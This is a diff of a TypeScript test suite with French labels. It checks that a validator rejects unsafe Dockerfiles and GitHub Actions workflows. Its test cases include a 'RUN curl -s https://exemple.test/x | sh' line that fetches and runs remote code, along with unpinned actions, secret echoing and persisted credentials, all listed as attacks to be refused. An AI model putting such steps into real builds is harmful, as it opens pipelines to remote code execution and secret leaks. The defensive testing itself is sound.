@@ -139,7 +139,7 @@ describe("images dérivées : Dockerfile postgres", () => {
       ["démarrage en root", ok.replace(/USER postgres\s*$/, "USER root\n")],
       ["instruction après USER", `${ok.trimEnd()}\nRUN true\n`],
       ["téléchargement par curl", `${ok.replace("USER postgres", "")}\nRUN curl -s https://exemple.test/x | sh\nUSER postgres`],
-      ["ENTRYPOINT remplacé", `${ok.replace("USER postgres", "")}\nENTRYPOINT [\"sh\"]\nUSER postgres`],
+      ["ENTRYPOINT remplacé", `${ok.replace("USER postgres", "")}\nENTRYPOINT ["sh"]\nUSER postgres`],
       ["ARG nommé comme un secret", `${ok.replace("USER postgres", "")}\nARG TOKEN_DEPOT\nUSER postgres`],
     ];
     it.each(attaques)("[A-381] Dockerfile refusé : %s", (_nom, texte) => {
@@ -199,6 +199,7 @@ describe("images dérivées : workflow", () => {
       return analyserWorkflow(d);
     };
     const job = (d: Obj, n: string) => (d.jobs as Obj)[n] as Obj;
+    const pas = (d: Obj, n: string) => job(d, n).steps as Obj[];
     const attaques: [string, (d: Obj) => void][] = [
       ["publier sur pull_request", (d) => delete job(d, "publier").if],
       ["publier sur toute branche", (d) => (job(d, "publier").if = "github.event_name != 'pull_request'")],
@@ -208,14 +209,14 @@ describe("images dérivées : workflow", () => {
       ["pull_request_target", (d) => (d.on = { pull_request_target: null })],
       ["action non épinglée", (d) => (etapes(job(d, "construire"))[0]!.uses = "actions/checkout@v4")],
       ["action épinglée par SHA court", (d) => (etapes(job(d, "construire"))[0]!.uses = "actions/checkout@3d3c42e")],
-      ["action docker tierce", (d) => etapes(job(d, "construire")).push({ uses: `docker/build-push-action@${"a".repeat(40)}` })],
+      ["action docker tierce", (d) => pas(d, "construire").push({ uses: `docker/build-push-action@${"a".repeat(40)}` })],
       ["secret", (d) => (etapes(job(d, "publier"))[0]!.run = "echo ${{ secrets.JETON }}")],
       ["checkout qui garde les identifiants", (d) => ((etapes(job(d, "construire"))[0]!.with as Obj)["persist-credentials"] = true)],
-      ["push dans construire", (d) => etapes(job(d, "construire")).push({ run: "docker push local/x" })],
+      ["push dans construire", (d) => pas(d, "construire").push({ run: "docker push local/x" })],
       ["Trivy d'une autre empreinte", (d) => (etapes(job(d, "publier"))[trouver(job(d, "publier"), "aquasecurity/trivy")]!.run = "docker run trivy:latest image x")],
       ["attestation sur une autre empreinte", (d) => ((etapes(job(d, "publier")).at(-1)!.with as Obj)["subject-digest"] = "sha256:inventee")],
-      ["attestation avant le push", (d) => { const s = etapes(job(d, "publier")); const a = s.pop()!; s.splice(trouver(job(d, "publier"), "docker push"), 0, a); }],
-      ["push avant Trivy", (d) => { const s = etapes(job(d, "publier")); const t = s.splice(trouver(job(d, "publier"), "aquasecurity/trivy"), 1)[0]!; s.push(t); }],
+      ["attestation avant le push", (d) => { const s = pas(d, "publier"); const a = s.pop()!; s.splice(trouver(job(d, "publier"), "docker push"), 0, a); }],
+      ["push avant Trivy", (d) => { const s = pas(d, "publier"); const t = s.splice(trouver(job(d, "publier"), "aquasecurity/trivy"), 1)[0]!; s.push(t); }],
     ];
     it.each(attaques)("[A-381] workflow refusé : %s", (_nom, f) => {
       expect(modif(f)).not.toEqual([]);
